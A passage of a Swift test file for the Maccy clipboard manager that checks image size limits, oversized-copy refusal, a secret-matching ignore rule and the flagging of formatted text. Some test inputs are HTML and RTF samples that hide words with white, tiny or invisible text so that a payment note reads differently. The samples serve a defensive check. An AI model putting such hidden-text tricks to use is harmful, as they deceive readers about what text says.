    func everyImageIsChecked() async throws {
      ContentLimits.maximumImagePixelsForTesting = 100
      let tiff = try container(.tiff, [(10, 10), (20, 20)])
      #expect(ValidatedImage.inspect(tiff) == .failure(.imageTooLarge(index: 1, pixels: 400)))
      let tiffItem = imageItem(tiff, type: .tiff)
      #expect(tiffItem.imagePixelSize == nil)
      #expect(!HistoryItemDecorator(tiffItem).hasImage)
      let decodes = ValidatedImage.decodesForTesting
      #expect(await tiffItem.decodedImage(for: .preview) == nil)
      #expect(ValidatedImage.cgImage(from: tiff, for: .fullSize) == nil)
      #expect(ValidatedImage.decodesForTesting == decodes)

      // Within the limits the first image is the one decoded (what other apps
      // show); the largest is what capture keeps.
      ContentLimits.maximumImagePixelsForTesting = 400
      let decoded = try #require(ValidatedImage.cgImage(from: tiff, for: .fullSize))
      #expect(decoded.width == 10)
      #expect(decoded.height == 10)
      #expect(try ValidatedImage.inspect(tiff).get().largestIndex == 1)

      // Animations: the number of frames and their total pixels are bounded.
      ContentLimits.maximumImagePixelsForTesting = 100
      let manyFrames = try container(.gif, Array(repeating: (1, 1), count: 40))
      ValidatedImage.maximumImageCountForTesting = 32
      #expect(ValidatedImage.inspect(manyFrames) == .failure(.tooManyImages(40)))
      ValidatedImage.maximumImageCountForTesting = nil
      let largeTotal = try container(.gif, Array(repeating: (10, 10), count: 3))
      #expect(ValidatedImage.inspect(largeTotal) == .failure(.totalTooLarge(pixels: 300)))
      let apng = try container(.png, Array(repeating: (10, 10), count: 3))
      #expect(!ValidatedImage.isAcceptable(apng))
      #expect(ValidatedImage.isAcceptable(try container(.gif, Array(repeating: (10, 10), count: 2))))

      // Ordinary PNG and JPEG.
      ContentLimits.maximumImagePixelsForTesting = nil
      for (type, data) in [(NSPasteboard.PasteboardType.png, try pngData(width: 30, height: 20)),
                           (.jpeg, try jpegData(width: 30, height: 20))] {
        let item = imageItem(data, type: type)
        #expect(item.imagePixelSize == NSSize(width: 30, height: 20))
        let image = try #require(await item.decodedImage(for: .preview))
        #expect(image.cgImage.width == 30)
        #expect(image.cgImage.height == 20)
      }
      // A thumbnail is decoded at most 1024 pixels on its longest side.
      let large = try container(.png, [(3_000, 2_000)])
      let thumbnail = try #require(ValidatedImage.cgImage(from: large, for: .thumbnail))
      #expect(max(thumbnail.width, thumbnail.height) <= 1_024)
    }

    @Test("The Get intent converts images only through the validated decoder, off the main actor, and re-checks after")
    func getIntentImageExport() async throws {
      let exports = FileManager.default.temporaryDirectory.appending(path: "a7-exports-\(UUID().uuidString)")
      IntentImageExports.directoryForTesting = exports
      defer {
        IntentImageExports.directoryForTesting = nil
        Get.afterImageConversionForTesting = nil
        try? FileManager.default.removeItem(at: exports)
      }
      Defaults[.intentsEnabled] = true

      // A two-image TIFF over the limit: nothing is decoded or exported.
      ContentLimits.maximumImagePixelsForTesting = 100
      let decodes = ValidatedImage.decodesForTesting
      let tiffItem = imageItem(try container(.tiff, [(10, 10), (20, 20)]), type: .tiff)
      let (_, refused) = try await Get.export(tiffItem)
      #expect(refused == nil)
      #expect(ValidatedImage.decodesForTesting == decodes)

      // A normal image is exported as PNG through the same decoder.
      ContentLimits.maximumImagePixelsForTesting = nil
      let item = imageItem(try jpegData(width: 6, height: 4), type: .jpeg)
      let (_, url) = try await Get.export(item)
      let exported = try Data(contentsOf: try #require(url))
      #expect(Array(exported.prefix(8)) == [137, 80, 78, 71, 13, 10, 26, 10])
      let exportedSize = try #require(ValidatedImage.pixelSize(of: exported))
      #expect(exportedSize.width == 6)
      #expect(exportedSize.height == 4)
      #expect(ValidatedImage.decodesForTesting > decodes)

      // Intents turned off while the image was converted: nothing is handed out.
      Get.afterImageConversionForTesting = { Defaults[.intentsEnabled] = false }
      await #expect(throws: AppIntentError.disabled) { _ = try await Get.export(item) }

      // Images no longer stored by then: the converted image is not exported.
      Defaults[.intentsEnabled] = true
      let preferences = self.preferences
      Get.afterImageConversionForTesting = {
        preferences.set([NSPasteboard.PasteboardType.string.rawValue], forKey: StoragePolicy.preferenceKey)
      }
      let captioned = HistoryItem(contents: [
        HistoryItemContent(type: NSPasteboard.PasteboardType.png.rawValue, value: try pngData(width: 4, height: 4)),
        stringContent("caption")
      ])
      Storage.shared.context.insert(captioned)
      let (contents, afterPolicyChange) = try await Get.export(captioned)
      #expect(afterPolicyChange == nil)
      #expect(contents.image == nil)
      #expect(contents.text == "caption")
    }

    @Test("Thumbnail and preview share one file read; cleaned-up work doesn't come back")
    func imageLoadsAreCoalescedAndDiscarded() async throws {
      let files = FileManager.default
      let staging = files.temporaryDirectory.appending(path: "a7-uc-load-\(UUID().uuidString)")
      try files.createDirectory(at: staging, withIntermediateDirectories: true)
      defer { try? files.removeItem(at: staging) }
      UniversalClipboardFile.allowedDirectoriesForTesting = [staging.path]
      let url = staging.appending(path: "photo.jpeg")
      try jpegData(width: 8, height: 8).write(to: url)
      let reads = ThreadRecorder()
      UniversalClipboardFile.readObserverForTesting = { reads.record($0) }

      let item = universalClipboardItem(url)
      // Both start before either read finishes.
      let thumbnail = Task { @MainActor in await item.decodedImage(for: .thumbnail) }
      let preview = Task { @MainActor in await item.decodedImage(for: .preview) }
      let first = await thumbnail.value
      let second = await preview.value
      #expect(first != nil)
      #expect(second != nil)
      #expect(reads.values.count == 1)

      // Work started before a clean-up never repopulates the decorator or item.
      let decorator = HistoryItemDecorator(item)
      decorator.ensurePreviewImage()
      let task = try #require(decorator.previewImageGenerationTask)
      decorator.cleanupImages()
      _ = await task.result
      #expect(decorator.previewImage == nil)
      #expect(item.imageData == nil)
    }

    // MARK: Review round: bounded reads

    @Test("A later item's value of a type is not read unless ignore rules need it; each value is read once")
    func laterDuplicatesAreNotRead() throws {
      let firstProvider = CountingDataProvider([.string: Data("first".utf8)])
      let laterProvider = CountingDataProvider([.string: Data("second".utf8)])
      func copyBoth() {
        let first = NSPasteboardItem()
        first.setDataProvider(firstProvider, forTypes: [.string])
        let later = NSPasteboardItem()
        later.setDataProvider(laterProvider, forTypes: [.string])
        pasteboard.clearContents()
        pasteboard.writeObjects([first, later])
      }

      copyBoth()
      let copied = try #require(checkNow().first)
      #expect(stringValues(copied) == ["first"])
      #expect(firstProvider.count(for: .string) == 1)
      #expect(laterProvider.count(for: .string) == 0)

      // With an ignore rule, the rules read the later value too, but the
      // first is still read only once.
      Defaults[.ignoreRegexp] = ["^never-matches$"]
      copyBoth()
      let checked = try #require(checkNow().first)
      #expect(stringValues(checked) == ["first"])
      #expect(firstProvider.count(for: .string) == 2)
      #expect(laterProvider.count(for: .string) == 1)
    }

    @Test("Oversized text or HTML is refused before it is decoded or scanned, and the user is told")
    func oversizedIsRejectedBeforeDecoding() throws {
      let notifications = RecordingNotificationClient()
      let savedClient = Notifier.client
      Notifier.client = notifications
      defer { Notifier.client = savedClient }
      ContentLimits.maximumRepresentationBytesForTesting = 100
      let decodes = PasteboardCopyRead.decodesForTesting
      let rtfImports = RichTextImport.rtfImportsForTesting

      copyString(String(repeating: "a", count: 101))
      #expect(checkNow().isEmpty)

      // An empty string used to send the HTML to the scanner before its size was known.
      let item = NSPasteboardItem()
      item.setString("", forType: .string)
      item.setData(Data(repeating: 0x3C, count: 1_000), forType: .html)
      pasteboard.clearContents()
      pasteboard.writeObjects([item])
      #expect(checkNow().isEmpty)

      #expect(PasteboardCopyRead.decodesForTesting == decodes)
      #expect(RichTextImport.rtfImportsForTesting == rtfImports)

      notifications.resolvePermissions()
      #expect(notifications.added.count == 2)
      #expect(notifications.added.allSatisfy {
        $0.identifier == Notifier.copyTooLargeIdentifier && $0.content.body == "A copy was too large to save"
      })
    }

    // MARK: Second review round: one bounded snapshot

    @Test("The source marker is read once, inside the bounded snapshot and within the marker limit")
    func sourceMarkerIsBounded() throws {
      let notifications = RecordingNotificationClient()
      let savedClient = Notifier.client
      Notifier.client = notifications
      defer { Notifier.client = savedClient }
      ContentLimits.maximumRepresentationBytesForTesting = 100

      // The reviewer's input: a normal string and a lazy 1,000-byte marker,
      // with skip next armed.
      clipboard.perform(.toggleSkipNext)
      let provider = CountingDataProvider([
        .string: Data("hello".utf8),
        .source: Data(repeating: 0x61, count: 1_000)
      ])
      let item = NSPasteboardItem()
      item.setDataProvider(provider, forTypes: [.string, .source])
      pasteboard.clearContents()
      pasteboard.writeObjects([item])
      let reads = PasteboardCopyRead.readsForTesting
      #expect(checkNow().isEmpty)
      // Only the marker was read, by the snapshot, and it stopped there.
      #expect(PasteboardCopyRead.readsForTesting == reads + 1)
      #expect(provider.count(for: .source) == 1)
      #expect(provider.count(for: .string) == 0)
      // The skip is still armed, and a skipped copy is never announced.
      #expect(CaptureMode.effective(in: clipboard.capturePreferences) == .skipNext)
      notifications.resolvePermissions()
      #expect(notifications.added.isEmpty)
      clipboard.perform(.toggleSkipNext)
    }

    @Test("Skip next tells Maccy's own copies from the snapshot's marker bytes",
          arguments: [(true, false), (false, true)])
    func skipNextUsesSnapshotMarker(fromMaccy: Bool, consumesSkip: Bool) throws {
      clipboard.perform(.toggleSkipNext)
      let marker = fromMaccy ? NSPasteboard.PasteboardType.fromMaccy.rawValue : "com.example.editor"
      let provider = CountingDataProvider([.string: Data("hello".utf8), .source: Data(marker.utf8)])
      let item = NSPasteboardItem()
      item.setDataProvider(provider, forTypes: [.string, .source])
      pasteboard.clearContents()
      pasteboard.writeObjects([item])
      let reads = PasteboardCopyRead.readsForTesting
      #expect(checkNow().isEmpty)
      #expect(PasteboardCopyRead.readsForTesting == reads + 2)
      #expect(provider.count(for: .source) == 1)
      #expect(provider.count(for: .string) == 1)
      let mode = CaptureMode.effective(in: clipboard.capturePreferences)
      #expect(mode == (consumesSkip ? .capturing : .skipNext))
      if mode == .skipNext {
        clipboard.perform(.toggleSkipNext)
      }
    }

    @Test("A planned value the app didn't supply is not fetched again by the ignore rules")
    func unavailableValueIsNotRefetched() throws {
      Defaults[.ignoreRegexp] = ["^never-matches$"]
      // The provider supplies nothing for the string it advertises.
      let provider = CountingDataProvider([.html: Data("<p>x</p>".utf8)])
      let item = NSPasteboardItem()
      item.setDataProvider(provider, forTypes: [.string, .html])
      pasteboard.clearContents()
      pasteboard.writeObjects([item])
      // An advertised but undelivered value can't be checked, so the rules refuse it.
      #expect(checkNow().isEmpty)
      #expect(provider.count(for: .string) == 1)
      #expect(provider.count(for: .html) == 1)
    }

    @Test("A secret in a later pasteboard item rejects the whole copy through the watcher")
    func secretInLaterItemIsRejected() throws {
      Defaults[.ignoreRegexp] = ["sk-[A-Z0-9]{8,}"]
      let first = NSPasteboardItem()
      first.setString("meeting notes", forType: .string)
      let later = NSPasteboardItem()
      later.setString("token sk-ABCDEF123456", forType: .string)
      pasteboard.clearContents()
      pasteboard.writeObjects([first, later])
      #expect(checkNow().isEmpty)

      // Without the secret the same shape is recorded, as the first item's text.
      let clean = NSPasteboardItem()
      clean.setString("other notes", forType: .string)
      pasteboard.clearContents()
      pasteboard.writeObjects([NSPasteboardItem().withString("meeting notes"), clean])
      let recorded = try #require(checkNow().first)
      #expect(stringValues(recorded) == ["meeting notes"])
    }

    @Test("A denied Universal Clipboard read shows a neutral placeholder, is logged once and not retried")
    func deniedUniversalClipboardRead() async throws {
      let files = FileManager.default
      let staging = files.temporaryDirectory.appending(path: "a7-uc-denied-\(UUID().uuidString)")
      try files.createDirectory(at: staging, withIntermediateDirectories: true)
      defer {
        try? files.setAttributes([.posixPermissions: 0o600], ofItemAtPath: staging.appending(path: "a.jpeg").path)
        try? files.removeItem(at: staging)
      }
      UniversalClipboardFile.allowedDirectoriesForTesting = [staging.path]
      // A file this user may not open stands in for the sandbox's refusal.
      let denied = staging.appending(path: "a.jpeg")
      try jpegData().write(to: denied)
      try files.setAttributes([.posixPermissions: 0o000], ofItemAtPath: denied.path)
      let readable = staging.appending(path: "b.jpeg")
      try jpegData().write(to: readable)

      let reads = ThreadRecorder()
      UniversalClipboardFile.readObserverForTesting = { reads.record($0) }
      let item = universalClipboardItem(denied)
      #expect(await item.decodedImage(for: .preview) == nil)
      #expect(item.universalClipboardImageIsUnavailable)
      #expect(HistoryItemDecorator(item).isUniversalClipboardImage)
      #expect(UniversalClipboardFile.accessWasDenied)
      #expect(UniversalClipboardFile.accessDeniedLogsForTesting == 1)
      #expect(reads.values.count == 1)
      #expect(PreviewItemView.universalClipboardUnavailableNote == "Image from another device is not available")

      // Asking again, for this item or another, touches no file and logs nothing more.
      #expect(await item.decodedImage(for: .preview) == nil)
      let other = universalClipboardItem(readable)
      #expect(await other.decodedImage(for: .thumbnail) == nil)
      #expect(other.universalClipboardImageIsUnavailable)
      #expect(reads.values.count == 1)
      #expect(UniversalClipboardFile.accessDeniedLogsForTesting == 1)
    }

    // MARK: Second review round: one picture per stored image

    @Test("A multi-image TIFF is stored as the single image previewed; copy-back, Get and other decoders agree")
    func multiImageTIFFIsCanonicalized() async throws {
      let exports = FileManager.default.temporaryDirectory.appending(path: "a7-canonical-\(UUID().uuidString)")
      IntentImageExports.directoryForTesting = exports
      defer {
        IntentImageExports.directoryForTesting = nil
        try? FileManager.default.removeItem(at: exports)
      }
      Defaults[.intentsEnabled] = true
      // The reviewer's input: a 10×10 red first page and a 20×20 green second page.
      let tiff = try container(.tiff, [(10, 10), (20, 20)], colors: [(1, 0, 0), (0, 1, 0)])
      #expect(try ValidatedImage.inspect(tiff).get().imageCount == 2)
      pasteboard.clearContents()
      pasteboard.setData(tiff, forType: .tiff)

      let item = try #require(await checkNowAwaitingImages().first)
      let stored = try #require(item.contents.first { $0.type == NSPasteboard.PasteboardType.tiff.rawValue }?.value)
      #expect(stored != tiff)
      let inspection = try ValidatedImage.inspect(stored).get()
      #expect(inspection.imageCount == 1)
      #expect(inspection.width == 20 && inspection.height == 20)

      // The preview, a plain AppKit decoder, copy-back and Get all see the green 20×20 picture.
      let preview = try #require(await item.decodedImage(for: .preview))
      try expectGreen(preview.cgImage, width: 20)
      try expectGreen(try #require(NSBitmapImageRep(data: stored)?.cgImage), width: 20)
      #expect(!HistoryItemDecorator(item).imageHasSeveralPictures)

      clipboard.copy(item)
      let pasted = try #require(pasteboard.data(forType: .tiff))
      try expectGreen(try #require(NSBitmapImageRep(data: pasted)?.cgImage), width: 20)

      let (_, url) = try await Get.export(item)
      let exported = try Data(contentsOf: try #require(url))
      try expectGreen(try #require(NSBitmapImageRep(data: exported)?.cgImage), width: 20)
    }

    @Test("A single-image PNG, TIFF or JPEG is stored byte for byte",
          arguments: ["png", "tiff", "jpeg"])
    func singleImageIsStoredUnchanged(format: String) throws {
      let (type, data): (NSPasteboard.PasteboardType, Data) = switch format {
      case "png": (.png, try pngData(width: 7, height: 5))
      case "tiff": (.tiff, try container(.tiff, [(7, 5)]))
      default: (.jpeg, try jpegData(width: 7, height: 5))
      }
      let before = ValidatedImage.canonicalizationsForTesting
      pasteboard.clearContents()
      pasteboard.setData(data, forType: type)
      let item = try #require(checkNow().first)
      #expect(item.contents.first { $0.type == type.rawValue }?.value == data)
      #expect(ValidatedImage.canonicalizationsForTesting == before)
    }

    @Test("An item stored earlier with several pictures previews the first and says other apps may differ")
    func storedMultiImageItemWarns() async throws {
      let tiff = try container(.tiff, [(10, 10), (20, 20)], colors: [(1, 0, 0), (0, 1, 0)])
      let item = imageItem(tiff, type: .tiff)
      let decorator = HistoryItemDecorator(item)
      #expect(decorator.imageHasSeveralPictures)
      #expect(PreviewItemView.severalPicturesNote(true) ==
              "This image file contains several pictures. Other apps may show a different one.")
      #expect(PreviewItemView.severalPicturesNote(false) == nil)
      let preview = try #require(await item.decodedImage(for: .preview))
      #expect(preview.cgImage.width == 10)
      // The store is not rewritten.
      #expect(item.contents.first?.value == tiff)
    }

    @Test("An image source names its content by type and revision, stable across saves and new objects")
    func imageSourceIdentityIsStable() async throws {
      let png = try pngData(width: 6, height: 6)
      let item = imageItem(png)
      let before = try #require(item.imageSource(readableBy: StoragePolicy.currentReadAllowList))

      // PROBE: whether SwiftData hands back the same object for the same row.
      // Both objects are held, so an address can't be reused in between.
      let first = item.contents.first
      let again = item.contents.first
      try Storage.shared.context.save()
      let afterSave = item.contents.first
      print("PROBE content identity: unsaved same object=\(first === again) after save same object=\(first === afterSave)")

      // The source taken before the save still names the same image.
      #expect(item.imageSource(readableBy: StoragePolicy.currentReadAllowList) == before)
      #expect(await item.decodedImage(for: .thumbnail) != nil)

      // After the contents change, a source taken earlier no longer matches.
      item.contentsDidChange()
      #expect(item.imageSource(readableBy: StoragePolicy.currentReadAllowList) != before)
      #expect(item.contentRevision > 0)
    }

    // MARK: Second review round: when "too large" is announced

    @Test("An oversized copy is announced only if it would otherwise have been saved",
          arguments: ["plain", "skip next armed", "ignore rule configured", "invalid ignore rule"])
    func copyTooLargeNotification(setting: String) throws {
      let notifications = RecordingNotificationClient()
      let savedClient = Notifier.client
      Notifier.client = notifications
      defer { Notifier.client = savedClient }
      ContentLimits.maximumRepresentationBytesForTesting = 100
      switch setting {
      case "skip next armed": clipboard.perform(.toggleSkipNext)
      case "ignore rule configured": Defaults[.ignoreRegexp] = ["^password"]
      case "invalid ignore rule": Defaults[.ignoreRegexp] = ["("]
      default: break
      }

      copyString(String(repeating: "a", count: 101))
      #expect(checkNow().isEmpty)
      notifications.resolvePermissions()
      #expect(notifications.added.count == (setting == "plain" ? 1 : 0))
      if setting == "skip next armed" {
        #expect(CaptureMode.effective(in: clipboard.capturePreferences) == .skipNext)
        clipboard.perform(.toggleSkipNext)
      }
    }

    // MARK: Second review round: formatting allow-list

    @Test("Formatting outside the allow-list gets the neutral note even with equal text",
          arguments: [
            ("Do not pay Mallory 100", "<p><font color=white>Do not </font>pay Mallory 100</p>"),
            ("Pay Alice 100", "<bdo dir=rtl>Pay Alice 100</bdo>"),
            ("Pay Alice 100", "<p class=\"x\">Pay Alice 100</p>"),
            ("Pay Alice 100", "<p>Pay Alice <sup>100</sup></p>"),
            ("Pay Alice 100", "<p dir=\"rtl\">Pay Alice 100</p>"),
            ("Pay Alice 100", "<p onclick=\"x()\">Pay Alice 100</p>"),
            ("Pay Alice 100", "<!-- note --><p>Pay Alice 100</p>")
          ])
    func htmlOutsideAllowListIsNoted(plain: String, html: String) throws {
      let decorator = History.shared.added(try #require(copyPlainAndHTML(plain, html)))
      #expect(decorator.formattedTextComparison == .renderingNotChecked)
      #expect(!PreviewItemView.formattedTextNoteIsWarning(.renderingNotChecked))
    }

    @Test("Allow-listed HTML with equal text shows nothing")
    func allowListedHTMLShowsNothing() throws {
      let html = "<meta charset=\"utf-8\"><!--StartFragment--><div><h1>Pay</h1><p>Alice <b>and</b> <i>Bob</i> " +
        "<a href=\"https://example.invalid\">100</a></p><table><tbody><tr><td colspan=\"2\">x</td></tr></tbody>" +
        "</table></div><!--EndFragment-->"
      let decorator = History.shared.added(try #require(copyPlainAndHTML("Pay Alice and Bob 100 x", html)))
      #expect(decorator.formattedTextComparison == .noTextDifference)
    }

    @Test("RTF with a colour, tiny or shifted text gets the neutral note; fonts, bold and underline don't")
    func rtfOutsideAllowListIsNoted() throws {
      func comparison(_ rtf: String, plain: String) throws -> FormattedTextComparison {
        let item = NSPasteboardItem()
        item.setString(plain, forType: .string)
        item.setData(Data(rtf.utf8), forType: .rtf)
        pasteboard.clearContents()
        pasteboard.writeObjects([item])
        return History.shared.added(try #require(checkNow().first)).formattedTextComparison
      }
      let header = #"{\rtf1\ansi\deff0{\fonttbl{\f0 Helvetica;}}"# +
        #"{\colortbl;\red255\green255\blue255;\red200\green0\blue0;}\f0\fs24 "#
      // The reviewer's input: white on "Do not ", default on the rest.
      #expect(try comparison(header + #"{\cf1 Do not }pay Mallory 100}"#, plain: "Do not pay Mallory 100")
              == .renderingNotChecked)
      #expect(try comparison(header + #"{\cb2 Pay} Alice 100}"#, plain: "Pay Alice 100") == .renderingNotChecked)
      // Word's highlight and shading, which AppKit's reader ignores.
      #expect(try comparison(header + #"{\highlight2 Pay} Alice 100}"#, plain: "Pay Alice 100") == .renderingNotChecked)
      #expect(try comparison(header + #"{\chcbpat2 Pay} Alice 100}"#, plain: "Pay Alice 100") == .renderingNotChecked)
      #expect(try comparison(header + #"Pay {\v hidden}Alice 100}"#, plain: "Pay hiddenAlice 100") == .renderingNotChecked)
      #expect(try comparison(header + #"{\fs4 Pay} Alice 100}"#, plain: "Pay Alice 100") == .renderingNotChecked)
      #expect(try comparison(header + #"Pay Alice {\super 100}}"#, plain: "Pay Alice 100") == .renderingNotChecked)
      #expect(try comparison(header + #"Pay {\strike Alice} 100}"#, plain: "Pay Alice 100") == .renderingNotChecked)
      #expect(try comparison(header + #"\rtlpar Pay Alice 100}"#, plain: "Pay Alice 100") == .renderingNotChecked)
      #expect(try comparison(header + #"Pay {\b Alice} {\i\ul 100}}"#, plain: "Pay Alice 100") == .noTextDifference)
    }

    @Test("Windows and old Mac line endings don't warn, and are pasted unchanged")
    func carriageReturnsDontWarn() throws {
      copyString("line one\r\nline two\rline three")
      let decorator = History.shared.added(try #require(checkNow().first))
      #expect(!decorator.textWarnings.hasInvisibleCharacters)
      #expect(stringValues(decorator.item) == ["line one\r\nline two\rline three"])
    }

    @Test("The neutral note is a compact tag with the sentence as its help text")
    func neutralNoteIsATag() {
      #expect(PreviewItemView.formattedTagLabel == "Formatted")
      #expect(PreviewItemView.formattedTextNote(.renderingNotChecked) == "Formatted paste was not checked against this text.")
    }

    // MARK: Review round: text recognition

    @Test("Queued text recognition stops before it starts once recognition is turned off or cancelled",
          arguments: ["setting off", "cancelled"])
    func queuedRecognitionStops(how: String) async throws {
      OCRSetting.preferencesForTesting = try scratchDefaults()
      let started = ThreadRecorder()
      HistoryItem.recognitionWorkObserverForTesting = { started.record(false) }
      let visionInputs = ThreadRecorder()
      HistoryItem.visionInputObserverForTesting = { _ in visionInputs.record(false) }

      // Hold the recognition queue so every job is still waiting.
      let gate = DispatchSemaphore(value: 0)
      HistoryItem.textRecognitionQueueForTesting.async { gate.wait() }

      let before = HistoryItem.recognitionTasksForTesting.count
      for size in 4...6 {
        imageItem(try pngData(width: size, height: size)).regenerateTitle()
      }
      let tasks = Array(HistoryItem.recognitionTasksForTesting.dropFirst(before))
      #expect(tasks.count == 3)

      if how == "cancelled" {
        HistoryItem.cancelAllTextRecognition()
      } else {
        let off = try scratchDefaults()
        off.set(false, forKey: OCRSetting.preferenceKey)
        OCRSetting.preferencesForTesting = off
        History.shared.applyOCRSetting()
      }
      gate.signal()
      for task in tasks {
        await task.value
      }
      #expect(started.values.isEmpty)
      #expect(visionInputs.values.isEmpty)
    }

    @Test("Cancelling a job whose Vision request is registered cancels that request and discards its result")
    func runningRecognitionIsCancelled() async throws {
      OCRSetting.preferencesForTesting = try scratchDefaults()
      let job = TextRecognitionJob()
      // Called on the recognition queue once the request is registered,
      // immediately before Vision performs it.
      HistoryItem.visionInputObserverForTesting = { _ in job.cancel() }
      let text = await HistoryItem.recognizeText(imageData: try pngData(width: 40, height: 40), fileURL: nil, job: job)
      #expect(text == nil)
      #expect(job.cancelledRunningRequestForTesting)
    }

    // MARK: Helpers

    private func copyString(_ string: String) {
      pasteboard.clearContents()
      pasteboard.setString(string, forType: .string)
    }

    private func imageItem(_ data: Data, type: NSPasteboard.PasteboardType = .png) -> HistoryItem {
      let item = HistoryItem(contents: [
        HistoryItemContent(type: type.rawValue, value: data)
      ])
      Storage.shared.context.insert(item)
      return item
    }

    // An image container (TIFF pages, GIF or APNG frames) of solid images.
    private func container(
      _ type: UTType, _ sizes: [(Int, Int)], colors: [(CGFloat, CGFloat, CGFloat)]? = nil
    ) throws -> Data {
      let output = NSMutableData()
      let destination = try #require(CGImageDestinationCreateWithData(
        output as CFMutableData, type.identifier as CFString, sizes.count, nil
      ))
      let frame: [CFString: Any] = [
        kCGImagePropertyGIFDictionary: [kCGImagePropertyGIFDelayTime: 0.1],
        kCGImagePropertyPNGDictionary: [kCGImagePropertyAPNGDelayTime: 0.1]
      ]
      for (index, (width, height)) in sizes.enumerated() {
        let color = colors?[index] ?? (1, 0, 0)
        let context = try #require(CGContext(
          data: nil, width: width, height: height, bitsPerComponent: 8, bytesPerRow: 0,
          space: CGColorSpaceCreateDeviceRGB(), bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
        ))
        context.setFillColor(CGColor(red: color.0, green: color.1, blue: color.2, alpha: 1))
        context.fill(CGRect(x: 0, y: 0, width: width, height: height))
        CGImageDestinationAddImage(destination, try #require(context.makeImage()), frame as CFDictionary)
      }
      #expect(CGImageDestinationFinalize(destination))
      return output as Data
    }

    // One pasteboard item with plain text and HTML, recorded.
    private func copyPlainAndHTML(_ plain: String, _ html: String) -> HistoryItem? {
      let item = NSPasteboardItem()
      item.setString(plain, forType: .string)
      item.setString(html, forType: .html)
      pasteboard.clearContents()
      pasteboard.writeObjects([item])
      return checkNow().first
    }

    private func pngData(width: Int, height: Int) throws -> Data {
      let rep = try #require(NSBitmapImageRep(
        bitmapDataPlanes: nil, pixelsWide: width, pixelsHigh: height, bitsPerSample: 8, samplesPerPixel: 4,
        hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
      ))
      return try #require(rep.representation(using: .png, properties: [:]))
    }

    private func scratchSuiteName() -> String {
      "\(AppIdentity.bundleIdentifier).tests.untrustedContent.\(UUID().uuidString)"
    }

    private func scratchDefaults() throws -> UserDefaults {
      let name = scratchSuiteName()
      let defaults = try #require(UserDefaults(suiteName: name))
      defaults.removePersistentDomain(forName: name)
      return defaults
    }

    // Whether WebKit (modern or legacy) is in the process. Doesn't load it.
    private var webKitIsLoaded: Bool {
      NSClassFromString("WKWebView") != nil || NSClassFromString("WebView") != nil
    }

    private func universalClipboardItem(_ url: URL) -> HistoryItem {
      let item = HistoryItem()
      Storage.shared.context.insert(item)
      item.contents = [
        HistoryItemContent(type: NSPasteboard.PasteboardType.fileURL.rawValue, value: url.dataRepresentation),
        HistoryItemContent(type: NSPasteboard.PasteboardType.universalClipboard.rawValue, value: Data())
      ]
      return item
    }

    private func jpegData(width: Int = 4, height: Int = 4) throws -> Data {
      let rep = try #require(NSBitmapImageRep(
        bitmapDataPlanes: nil, pixelsWide: width, pixelsHigh: height, bitsPerSample: 8, samplesPerPixel: 3,
        hasAlpha: false, isPlanar: false, colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
      ))
      return try #require(rep.representation(using: .jpeg, properties: [:]))
    }

    // Title, list row, preview, editor, Get, formatted paste and plain paste
    // all yield `text`, and each paste writes it exactly once.
    private func expectReadsEverywhere(
      _ decorator: HistoryItemDecorator,
      as text: String,
      sourceLocation: SourceLocation = #_sourceLocation
    ) {
      let item = decorator.item
      #expect(item.displayTitle == text, sourceLocation: sourceLocation)
      #expect(decorator.title == text, sourceLocation: sourceLocation)
      #expect(item.previewableText == text, sourceLocation: sourceLocation)
      #expect(decorator.previewText.string == text, sourceLocation: sourceLocation)
      // The editor starts from the preview text.
      #expect(LargeTextView.EditorState(text: decorator.previewText.string).text == text,
              sourceLocation: sourceLocation)
      #expect(Get.contents(of: item, readableBy: StoragePolicy.currentReadAllowList).text == text,
              sourceLocation: sourceLocation)

      clipboard.copy(item)
      #expect(pastedStrings() == [text], sourceLocation: sourceLocation)
      clipboard.copy(item, removeFormatting: true)
      #expect(pastedStrings() == [text], sourceLocation: sourceLocation)
    }

    private func stringValues(_ item: HistoryItem) -> [String] {
      item.contents
        .filter { $0.type == NSPasteboard.PasteboardType.string.rawValue }
        .compactMap { $0.value.flatMap { String(data: $0, encoding: .utf8) } }
    }

    private func stringContent(_ text: String) -> HistoryItemContent {
      HistoryItemContent(type: NSPasteboard.PasteboardType.string.rawValue, value: Data(text.utf8))
    }

    // Every plain-text value on the pasteboard, across all its items.
    private func pastedStrings() -> [String] {
      (pasteboard.pasteboardItems ?? []).compactMap { $0.string(forType: .string) }
    }

    // A solid green image of the given width.
    private func expectGreen(
      _ image: CGImage, width: Int, sourceLocation: SourceLocation = #_sourceLocation
    ) throws {
      #expect(image.width == width, sourceLocation: sourceLocation)
      let rep = NSBitmapImageRep(cgImage: image)
      let color = try #require(rep.colorAt(x: image.width / 2, y: image.height / 2)?.usingColorSpace(.deviceRGB),
                               sourceLocation: sourceLocation)
      #expect(color.greenComponent > 0.8 && color.redComponent < 0.2, "\(color)", sourceLocation: sourceLocation)
    }

    // Runs one production watcher check, waits for any image re-encoding it
    // started, and returns what it recorded.
    private func checkNowAwaitingImages() async -> [HistoryItem] {
      var copies: [HistoryItem] = []
      clipboard.clearHooks()
      clipboard.pendingImageCanonicalizationForTesting = nil
      clipboard.onNewCopy { copies.append($0) }
      clipboard.checkForChangesInPasteboard()
      await clipboard.pendingImageCanonicalizationForTesting?.value
      clipboard.clearHooks()
      return copies
    }

    // Runs one production watcher check now and returns what it recorded.
    private func checkNow() -> [HistoryItem] {
      var copies: [HistoryItem] = []
      clipboard.clearHooks()
      clipboard.onNewCopy { copies.append($0) }
      clipboard.checkForChangesInPasteboard()
      clipboard.clearHooks()
      return copies
    }
  }
}

// Records, from any thread, whether each call ran on the main thread.
final class ThreadRecorder: @unchecked Sendable {
  private let lock = NSLock()
  private var recorded: [Bool] = []

  func record(_ onMainThread: Bool) {
    lock.withLock { recorded.append(onMainThread) }
  }

  var values: [Bool] { lock.withLock { recorded } }
}

extension NSPasteboardItem {
  func withString(_ string: String) -> NSPasteboardItem {
    setString(string, forType: .string)
    return self
  }
}

// Supplies pasteboard data on request and counts each request.
final class CountingDataProvider: NSObject, NSPasteboardItemDataProvider, @unchecked Sendable {
  private let lock = NSLock()
  private let values: [NSPasteboard.PasteboardType: Data]
  private var counts: [NSPasteboard.PasteboardType: Int] = [:]

  init(_ values: [NSPasteboard.PasteboardType: Data]) {
    self.values = values
  }

